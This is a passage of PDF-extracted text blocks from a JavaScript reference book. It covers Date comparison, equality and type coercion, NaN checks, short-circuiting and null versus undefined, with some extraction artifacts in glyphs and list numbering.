        "text": "Returns: \"2016-04-14T23:49:08.596Z\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 58",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 9: Date Comparison",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 9.1: Comparing Date values",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To check the equality of  Date  values:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  date1  =   new  Date (); var  date2  =   new  Date ( date1. valueOf ()   +   10 ); console. log ( date1. valueOf ()   ===  date2. valueOf ());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output:  false Note that you must use  valueOf ()  or  getTime ()  to compare the values of  Date  objects because the equality operator will compare if two object references are the same. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  date1  =   new  Date (); var  date2  =   new  Date (); console. log ( date1  ===  date2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output:  false Whereas if the variables point to the same object:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  date1  =   new  Date (); var  date2  =  date1 ; console. log ( date1  ===  date2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output:  true However, the other comparison operators will work as usual and you can use  <  and  >  to compare that one date is earlier or later than the other. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  date1  =   new  Date (); var  date2  =   new  Date ( date1. valueOf ()   +   10 ); console. log ( date1  <  date2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output:  true It works even if the operator includes equality:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  date1  =   new  Date (); var  date2  =   new  Date ( date1. valueOf ()); console. log ( date1  <=  date2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output:  true",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 59",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 9.2: Date Di\ue023erence Calculation",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To compare the di\ufb00erence of two dates, we can do the comparison based on the timestamp.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  date1  =   new  Date (); var  date2  =   new  Date ( date1. valueOf ()   +   5000 ); var  dateDiff  =  date1. valueOf ()   -  date2. valueOf (); var  dateDiffInYears  =  dateDiff / 1000 / 60 / 60 / 24 / 365 ;   //convert milliseconds into years console. log ( \"Date difference in years : \"   +  dateDiffInYears );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 60",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 10: Comparison Operations",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 10.1: Abstract equality / inequality and type conversion",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The Problem",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The abstract equality and inequality operators ( ==  and  != ) convert their operands if the operand types do not match. This type coercion is a common source of confusion about the results of these operators, in particular, these operators aren't always transitive as one would expect.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"\"   ==    0 ;       // true A   0   ==   \"0\" ;      // true A \"\"   ==   \"0\" ;      // false B false   ==   0 ;     // true false   ==   \"0\" ;   // true \"\"   !=    0 ;       // false A   0   !=   \"0\" ;      // false A \"\"   !=   \"0\" ;      // true B false   !=   0 ;     // false false   !=   \"0\" ;   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The results start to make sense if you consider how JavaScript converts empty strings to numbers.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Number ( \"\" );      // 0 Number ( \"0\" );     // 0 Number ( false );   // 0",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The Solution",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "In the statement  false  B , both the operands are strings ( \"\"  and  \"0\" ), hence there will be  no type conversion  and since  \"\"  and  \"0\"  are not the same value,  \"\"   ==   \"0\"  is  false  as expected. One way to eliminate unexpected behavior here is making sure that you always compare operands of the same type. For example, if you want the results of numerical comparison use explicit conversion:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  test  =   ( a , b )   =>  Number ( a )   ==  Number ( b ); test ( \"\" ,   0 );          // true; test ( \"0\" ,   0 );         // true test ( \"\" ,   \"0\" );        // true;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "test ( \"abc\" ,   \"abc\" );   // false as operands are not numbers",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Or, if you want string comparison:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  test  =   ( a , b )   =>  String ( a )   ==  String ( b ); test ( \"\" ,   0 );     // false; test ( \"0\" ,   0 );    // true test ( \"\" ,   \"0\" );   // false;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Side-note :  Number ( \"0\" )  and  new  Number ( \"0\" )  isn't the same thing! While the former performs a type conversion, the latter will create a new object. Objects are compared by reference and not by value which explains the results below.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Number ( \"0\" )   ==  Number ( \"0\" );           // true;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 61",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "new  Number ( \"0\" )   ==   new  Number ( \"0\" );   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Finally, you have the option to use strict equality and inequality operators which will not perform any implicit type conversions.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"\"   ===    0 ;    // false   0   ===   \"0\" ;   // false \"\"   ===   \"0\" ;   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Further reference to this topic can be found here: Which equals operator (== vs ===) should be used in JavaScript comparisons? . Abstract Equality (==)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.2: NaN Property of the Global Object",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "NaN  (\" N ot  a   N umber\") is a special value de\ufb01ned by the  IEEE Standard for Floating-Point Arithmetic , which is used when a non-numeric value is provided but a number is expected ( 1   *   \"two\" ), or when a calculation doesn't have a valid",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "number  result ( Math. sqrt (- 1 ) ).",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Any equality or relational comparisons with  NaN  returns  false , even comparing it with itself. Because,  NaN  is supposed to denote the result of a nonsensical computation, and as such, it isn \u2019 t equal to the result of any other nonsensical computations.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( 1   *   \"two\" )   ===   NaN    //false NaN   ===   0 ;            // false NaN   ===   NaN ;          // false Number. NaN   ===   NaN ;   // false NaN   <   0 ;              // false NaN   >   0 ;              // false NaN   >   0 ;              // false NaN   >=   NaN ;           // false NaN   >=   'two' ;         // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Non-equal comparisons will always return  true :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "NaN   !==   0 ;            // true NaN   !==   NaN ;          // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Checking if a value is NaN",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "You can test a value or expression for  NaN  by using the function Number.isNaN():",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Number. isNaN ( NaN );           // true Number. isNaN ( 0   /   0 );         // true Number. isNaN ( 'str'   -   12 );    // true Number. isNaN ( 24 );            // false Number. isNaN ( '24' );          // false Number. isNaN ( 1   /   0 );         // false Number. isNaN ( Infinity );      // false Number. isNaN ( 'str' );         // false Number. isNaN ( undefined );     // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 62",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Number. isNaN ({});            // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version < 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "You can check if a value is  NaN  by comparing it with itself:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "value  !==  value ;      // true for NaN, false for any other value",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can use the following poly\ufb01ll for  Number. isNaN () :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Number. isNaN   =  Number. isNaN   ||   function ( value )   {           return  value  !==  value ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "By contrast, the global function  isNaN ()  returns  true  not only for  NaN , but also for any value or expression that cannot be coerced into a number:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "isNaN ( NaN );           // true isNaN ( 0   /   0 );         // true isNaN ( 'str'   -   12 );    // true isNaN ( 24 );            // false isNaN ( '24' );          // false isNaN ( Infinity );      // false isNaN ( 'str' );         // true isNaN ( undefined );     // true isNaN ({});            // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "ECMAScript de\ufb01nes a  \u201c sameness \u201d  algorithm called  SameValue  which, since ECMAScript 6, can be invoked with Object. is . Unlike the  ==  and  ===  comparison, using  Object. is ()  will treat  NaN  as identical with itself (and  -0  as not identical with  +0 ):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object. is ( NaN ,   NaN )        // true Object. is (+ 0 ,   0 )           // false NaN   ===   NaN                // false + 0   ===   0                   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version < 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "You can use the following poly\ufb01ll for  Object. is ()  (from  MDN ):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   (! Object. is )   {   Object. is   =   function ( x ,  y )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // SameValue algorithm      if   ( x  ===  y )   {   // Steps 1-5, 7-10        // Steps 6.b-6.e: +0 != -0",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       return  x  !==   0   ||   1   /  x  ===   1   /  y ;      }   else   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       // Step 6.a: NaN == NaN",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "       return  x  !==  x  &&  y  !==  y ;      }    }; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Points to note",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "NaN itself is a number, meaning that it does not equal to the string \"NaN\", and most importantly (though perhaps unintuitively):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 63",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "typeof ( NaN )   ===   \"number\" ;   //true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 10.3: Short-circuiting in boolean operators",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The and-operator ( && ) and the or-operator ( || ) employ short-circuiting to prevent unnecessary work if the outcome of the operation does not change with the extra work. In  x  &&  y ,  y  will not be evaluated if  x  evaluates to  false , because the whole expression is guaranteed to be  false . In  x  ||  y ,  y  will not be evaluated if  x  evaluated to  true , because the whole expression is guaranteed to be  true .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Example with functions",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Take the following two functions:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  T ()   {   // True",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  console. log ( \"T\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return   true ; } function  F ()   {   // False",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  console. log ( \"F\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   return   false ; }",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example 1",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "T ()   &&  F ();   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Output: 'T' 'F'",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Example 2",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "F ()   &&  T ();   // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Output: 'F'",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Example 3",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "T ()   ||  F ();   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Output: 'T'",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Example 4",
        "font_name": "OpenSans-BoldItalic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 64",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "F ()   ||  T ();   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Output: 'F' 'T'",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Short-circuiting to prevent errors",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj ;   // object has value of undefined if ( obj. property ){   } // TypeError: Cannot read property 'property' of undefined if ( obj. property   &&  obj  !==   undefined ){} // Line A TypeError: Cannot read property 'property' of undefined",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Line A: if you reverse the order the \ufb01rst conditional statement will prevent the error on the second by not executing it if it would throw the error",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if ( obj  !==   undefined   &&  obj. property ){};   // no error thrown",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "But should only be used if you expect  undefined",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if ( typeof  obj  ===   \"object\"   &&  obj. property ){};   // safe option but slower",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Short-circuiting to provide a default value",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The  ||  operator can be used to select either a \"truthy\" value, or the default value. For example, this can be used to ensure that a nullable value is converted to a non-nullable value:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  nullableObj  =   null ; var  obj  =  nullableObj  ||   {};    // this selects {} var  nullableObj2  =   { x :   5 }; var  obj2  =  nullableObj2  ||   {}   // this selects {x: 5}",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Or to return the \ufb01rst truthy value",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  truthyValue  =   { x :   10 };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "return  truthyValue  ||   {};   // will return {x: 10}",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The same can be used to fall back multiple times:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "envVariable  ||  configValue  ||  defaultConstValue  // select the first \"truthy\" of these",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Short-circuiting to call an optional function",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The  &&  operator can be used to evaluate a callback, only if it is passed:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  myMethod ( cb )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // This can be simplified",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     if   ( cb )   {        cb ();      }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 65",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     // To this",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    cb  &&  cb (); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Of course, the test above does not validate that  cb  is in fact a  function  and not just an",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Object / Array / String / Number .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 10.4: Null and Unde\ufb01ned",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The di\ufb00erences between  null  and  undefined",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "null  and  undefined  share abstract equality  ==  but not strict equality  === ,",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "null   ==   undefined     // true null   ===   undefined    // false",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "They represent slightly di\ufb00erent things: undefined  represents the  absence of a value , such as before an identi\ufb01er/Object property has been created or in the period between identi\ufb01er/Function parameter creation and it's \ufb01rst set, if any. null  represents the  intentional  absence of a value  for an identi\ufb01er or property which has already been created. They are di\ufb00erent types of syntax: undefined  is a  property of the global Object , usually immutable in the global scope. This means anywhere you can de\ufb01ne an identi\ufb01er other than in the global namespace could hide  undefined  from that scope (although things can still  be   undefined ) null  is a  word literal , so it's meaning can never be changed and attempting to do so will throw an  Error .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The similarities between  null  and  undefined",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "null  and  undefined  are both falsy.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if   ( null )  console. log ( \"won't be logged\" ); if   ( undefined )  console. log ( \"won't be logged\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Neither  null  or  undefined  equal  false  (see  this question ).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "false   ==   undefined     // false",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "false   ==   null          // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "false   ===   undefined    // false",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "false   ===   null         // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Using  undefined",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If the current scope can't be trusted, use something which evaluates to  unde\ufb01ned , for example  void   0 ; . If  undefined  is shadowed by another value, it's just as bad as shadowing  Array  or  Number . Avoid  setting  something as  undefined . If you want to remove a property  bar  from an  Object   foo ,  delete foo. bar ;  instead. Existence testing identi\ufb01er  foo  against  undefined   could throw a Reference Error , use  typeof  foo  against",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"undefined\"  instead.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 10.5: Abstract Equality (==)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Operands of the abstract equality operator are compared  after  being converted to a common type. How this",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 66",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "conversion happens is based on the speci\ufb01cation of the operator: Speci\ufb01cation for the  ==  operator:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "7.2.13 Abstract Equality Comparison",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The comparison  x  ==  y , where  x  and  y  are values, produces  true  or  false . Such a comparison is performed as follows: If  Type ( x )  is the same as  Type ( y ) , then: 1. a.  Return the result of performing Strict Equality Comparison  x  ===  y . If  x  is  null  and  y  is  undefined , return  true . 2. If  x  is  undefined  and  y  is  null , return  true . 3. If  Type ( x )  is  Number  and  Type ( y )  is  String , return the result of the comparison  x  ==  ToNumber ( y ) . 4. If  Type ( x )  is  String  and  Type ( y )  is  Number , return the result of the comparison  ToNumber ( x )   ==  y . 5. If  Type ( x )  is  Boolean , return the result of the comparison  ToNumber ( x )   ==  y . 6.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "If  Type ( y )  is  Boolean , return the result of the  comparison x  ==  ToNumber ( y ) . 7.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If  Type ( x )  is either  String ,  Number , or  Symbol  and  Type ( y )  is  Object , return the result of the 8.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "comparison  x  ==  ToPrimitive ( y ) .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If  Type ( x )  is Object and  Type ( y )  is either  String ,  Number , or  Symbol , return the result of the 9.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "comparison  ToPrimitive ( x )   ==  y .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Return  false . 10.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Examples:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "1   ==   1 ;                       // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "1   ==   true ;                    // true  (operand converted to number: true => 1) 1   ==   '1' ;                     // true  (operand converted to number: '1' => 1 )",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "1   ==   '1.00' ;                  // true 1   ==   '1.00000000001' ;         // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "1   ==   '1.00000000000000001' ;   // true  (true due to precision loss) null   ==   undefined ;            // true  (spec #2)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "1   ==   2 ;                       // false 0   ==   false ;                   // true 0   ==   undefined ;               // false 0   ==   \"\" ;                      // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 10.6: Logic Operators with Booleans",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  x  =   true ,",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    y  =   false ; AND",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This operator will return true if both of the expressions evaluate to true. This boolean operator will employ short- circuiting and will not evaluate  y  if  x  evaluates to  false .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "x  &&  y ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will return false, because  y  is false. OR This operator will return true if one of the two expressions evaluate to true. This boolean operator will employ",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 67",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "short-circuiting and  y  will not be evaluated if  x  evaluates to  true .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "x  ||  y ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will return true, because  x  is true. NOT This operator will return false if the expression on the right evaluates to true, and return true if the expression on the right evaluates to false.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "! x ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will return false, because  x  is true.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 10.7: Automatic Type Conversions",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Beware that numbers can accidentally be converted to strings or NaN (Not a Number). JavaScript is loosely typed. A variable can contain di\ufb00erent data types, and a variable can change its data type:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  x  =   \"Hello\" ;       // typeof x is a string x  =   5 ;                 // changes typeof x to a number",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When doing mathematical operations, JavaScript can convert numbers to strings:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  x  =   5   +   7 ;         // x.valueOf() is 12,  typeof x is a number var  x  =   5   +   \"7\" ;       // x.valueOf() is 57,  typeof x is a string var  x  =   \"5\"   +   7 ;       // x.valueOf() is 57,  typeof x is a string var  x  =   5   -   7 ;         // x.valueOf() is -2,  typeof x is a number var  x  =   5   -   \"7\" ;       // x.valueOf() is -2,  typeof x is a number var  x  =   \"5\"   -   7 ;       // x.valueOf() is -2,  typeof x is a number var  x  =   5   -   \"x\" ;       // x.valueOf() is NaN, typeof x is a number",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Subtracting a string from a string, does not generate an error but returns NaN (Not a Number):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"Hello\"   -   \"Dolly\"      // returns NaN",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 10.8: Logic Operators with Non-boolean values (boolean coercion)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Logical OR ( || ), reading left to right, will evaluate to the \ufb01rst  truthy  value. If no  truthy  value is found, the last value is returned.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   'hello'   ||   '' ;               // a = 'hello' var  b  =   ''   ||   [];                    // b = [] var  c  =   ''   ||   undefined ;             // c = undefined var  d  =   1   ||   5 ;                      // d = 1 var  e  =   0   ||   {};                     // e = {} var  f  =   0   ||   ''   ||   5 ;                // f = 5 var  g  =   ''   ||   'yay'   ||   'boo' ;        // g = 'yay'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Logical AND ( && ), reading left to right, will evaluate to the \ufb01rst  falsy  value. If no  falsey  value is found, the last value is returned.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
